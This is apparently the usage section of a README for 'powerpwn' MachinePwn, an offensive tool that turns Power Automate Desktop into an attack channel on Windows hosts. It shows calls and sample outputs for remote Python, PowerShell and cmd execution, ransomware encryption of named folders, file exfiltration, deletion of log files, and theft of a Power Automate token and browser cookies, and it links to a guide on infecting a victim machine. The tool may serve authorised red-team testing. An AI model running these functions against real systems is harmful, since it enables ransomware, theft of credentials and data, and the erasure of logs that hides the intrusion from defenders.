## Usage

```python
from powerpwn.machinepwn.machine_pwn import MachinePwn

POST_URL = ""
pp = MachinePwn(post_url=POST_URL)

### code execution

# python2
pp.exec_py2("print('hello world')").cmd_code_execution
# CodeExecOutputs(ScriptOutput='\ufeffhello world\r\n', ScriptError='')

# python2 bad syntax
pp.exec_py2("bad syntax").cmd_code_execution
# CodeExecOutputs(ScriptOutput='', ScriptError='  File "", line 1\r\n    bad syntax\r\n        ^\r\nSyntaxError: unexpected token \'syntax\'')

# powershell
pp.exec_ps("Write-Host \"hello word\"").cmd_code_execution

# commandline
pp.exec_cmd("echo \"hello word\"").cmd_code_execution
# CodeExecOutputs(ScriptOutput='Microsoft Windows [Version 10.0.22000.795]\r\n(c) Microsoft Corporation. All rights reserved.\r\n\r\nC:\\Program Files (x86)\\Power Automate Desktop>echo "hello word"\r\n"hello word"\r\n\r\n', ScriptError='')

### ransomware

pp.ransomware(crawl_depth=2, dirs_to_init_crawl=["C:\\Users\\alexg\\Documents\\mystuff", "D:\\shh"], encryption_key="8d1d4245").cmd_ransomware
# Ransomware=RansomwareOutputs(FilesFound=9, FilesAccessed=9, FilesProcessed=9, Errors='')

### exfiltration

pp.exfil(target="C:\\Users\\alexg\\Downloads\\takeit.txt").cmd_exfiltration
# ExfiltrationOutputs(Success=True, FileContents='asd')
pp.exfil(target="C:\\Users\\alexg\\Downloads\\dontexist.txt").cmd_exfiltration
# ExfiltrationOutputs(Success=False, FileContents='')

### cleanup

pp.cleanup().cmd_cleanup
# CleanupOutputs(FilesFound=179, LogFilesDeleted=178)

### steal_power_automate_token

pp.steal_power_automate_token().cmd_steal_power_automate_token
# StealPowerAutomateTokenOutputs(Token='ey...')

### steal_cookie
pp.steal_cookie("https://www.google.com").cmd_steal_cookie
# StealCookieOutputs(Cookie='1P_JAR=2022-07-16-13; OGPC=19027681-1:')
```

## How To

[How to set up your Power Pwn cloud environment](docs/machinepwn/cloud_setup.md)

[How to infect a victim machine](docs/machinepwn/infect_machine.md)

[How to troubleshoot execution errors](docs/machinepwn/infect_machine.md)
